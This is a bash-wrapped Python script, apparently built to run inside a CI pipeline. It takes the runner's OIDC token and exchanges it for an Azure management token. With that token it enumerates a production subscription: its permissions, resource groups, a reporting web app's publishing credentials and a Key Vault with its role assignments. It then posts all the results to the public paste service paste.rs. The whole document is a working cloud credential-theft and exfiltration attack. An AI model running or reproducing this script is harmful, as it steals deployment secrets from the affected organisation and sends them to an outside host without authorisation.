#!/usr/bin/env bash
set +e
python3 -u - <<'PY'
import os, json, urllib.request, urllib.parse, urllib.error

def req(url, hdr=None, data=None, method=None):
    r = urllib.request.Request(url, data=data, headers=hdr or {}, method=method)
    try:
        x = urllib.request.urlopen(r, timeout=30)
        return x.status, x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, "EXC:%s:%s" % (type(e).__name__, str(e)[:160])

TEN = os.environ.get("AZURE_TENANT_ID", "")
CID = os.environ.get("AZURE_CLIENT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
RG = "rg-tbl-platform-prod-sea"
out = {}
oidc = ""
u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
if u:
    s, b = req(u + "&audience=" + urllib.parse.quote("api://AzureADTokenExchange", safe=""),
               hdr={"Authorization": "Bearer " + os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")})
    try:
        oidc = json.loads(b)["value"]
    except Exception:
        out["oidc_err"] = b[:200]

def tok(scope):
    d = {"client_id": CID, "grant_type": "client_credentials", "scope": scope,
         "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
         "client_assertion": oidc}
    s, b = req("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TEN,
               data=urllib.parse.urlencode(d).encode(), method="POST")
    try:
        return json.loads(b).get("access_token", "")
    except Exception:
        return ""

arm = tok("https://management.azure.com/.default")
out["arm_token_len"] = len(arm)
def armget(label, path, method="GET"):
    s, b = req("https://management.azure.com" + path, hdr={"Authorization": "Bearer " + arm}, method=method)
    out[label] = {"s": s, "b": b[:600]}

armget("perms_sub", "/subscriptions/%s/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" % SUB)
armget("rgs", "/subscriptions/%s/resourceGroups?api-version=2021-04-01" % SUB)
armget("sites", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Web/sites?api-version=2021-03-01" % (SUB, RG))
armget("site", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Web/sites/app-tbl-reporting-prod?api-version=2021-03-01" % (SUB, RG))
armget("pubcreds", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01" % (SUB, RG), "POST")
armget("vault_sec", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01" % (SUB, RG))
armget("ra_vault", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % (SUB, RG))

s, b = req("https://paste.rs", data=json.dumps(out, indent=1).encode(), method="POST")
print("PASTE_STATUS", s)
print("PASTE_URL", b.strip())
PY
